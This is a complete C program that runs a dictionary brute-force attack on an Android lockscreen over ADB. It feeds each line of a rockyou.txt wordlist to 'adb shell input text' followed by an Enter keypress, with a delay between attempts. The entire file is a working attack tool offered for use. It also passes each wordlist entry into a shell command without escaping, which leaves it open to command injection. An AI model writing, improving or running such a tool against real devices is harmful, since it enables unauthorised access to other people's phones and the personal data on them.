#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_LINE 128

int main() {
    FILE *fp;
    char password[MAX_LINE];
    char command[256];

    printf("[*] Starting Android ADB Dictionary Brute-force...\n");

    fp = fopen("rockyou.txt", "r");
    if (fp == NULL) {
        perror("[-] rockyou.txt not found!");
        return 1;
    }

    while (fgets(password, MAX_LINE, fp) != NULL) {
        // Remove newline
        password[strcspn(password, "\n")] = 0;

        snprintf(command, sizeof(command),
            "adb shell input text \"%s\" && adb shell input keyevent 66", password);

        printf("[*] Trying: %s\n", password);
        system(command);
        sleep(2);  // Delay for lockscreen

        // Optional: Add logic to detect successful unlock
    }

    fclose(fp);
    printf("[+] Dictionary attack completed.\n");
    return 0;
}